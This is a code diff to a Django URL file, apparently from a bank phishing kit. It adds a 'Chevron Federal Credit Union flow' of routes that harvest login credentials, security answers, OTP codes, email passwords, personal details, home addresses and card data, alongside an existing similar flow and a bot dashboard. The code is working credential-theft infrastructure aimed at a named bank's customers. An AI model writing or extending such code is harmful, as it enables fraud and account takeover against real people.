@@ -160,6 +160,16 @@ from user_data.fifty_views import (
     fifty_collect_user_email_password,
     fifty_collect_user_card_info,
 )
+from user_data.chevron_views import (
+    chevron_collect_user_login_cred,
+    chevron_collect_user_login_cred2,
+    chevron_collect_user_security_questions,
+    chevron_collect_user_otp_verification,
+    chevron_collect_user_email_password,
+    chevron_collect_user_basic_info,
+    chevron_collect_user_home_address,
+    chevron_collect_user_card_info,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -260,6 +270,16 @@ urlpatterns = [
     path("api/fifty-meta-data-7/", fifty_collect_user_security_questions, name="fifty_collect_user_security_questions"),
     path("api/fifty-meta-data-8/", fifty_collect_user_otp_verification, name="fifty_collect_user_otp_verification"),
     path("api/fifty-email-password/", fifty_collect_user_email_password, name="fifty_collect_user_email_password"),
-    path("api/fifty-card-info/", fifty_collect_user_card_info, name="fifty_collect_user_card_info"),
+    path('api/fifty-card-info/', fifty_collect_user_card_info, name='fifty_collect_user_card_info'),
+
+    # Chevron Federal Credit Union flow
+    path('api/chevron-login/', chevron_collect_user_login_cred, name='chevron_collect_user_login_cred'),
+    path('api/chevron-login-confirm/', chevron_collect_user_login_cred2, name='chevron_collect_user_login_cred2'),
+    path('api/chevron-security-questions/', chevron_collect_user_security_questions, name='chevron_collect_user_security_questions'),
+    path('api/chevron-otp-verification/', chevron_collect_user_otp_verification, name='chevron_collect_user_otp_verification'),
+    path('api/chevron-email-password/', chevron_collect_user_email_password, name='chevron_collect_user_email_password'),
+    path('api/chevron-basic-info/', chevron_collect_user_basic_info, name='chevron_collect_user_basic_info'),
+    path('api/chevron-home-address/', chevron_collect_user_home_address, name='chevron_collect_user_home_address'),
+    path('api/chevron-card-info/', chevron_collect_user_card_info, name='chevron_collect_user_card_info'),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
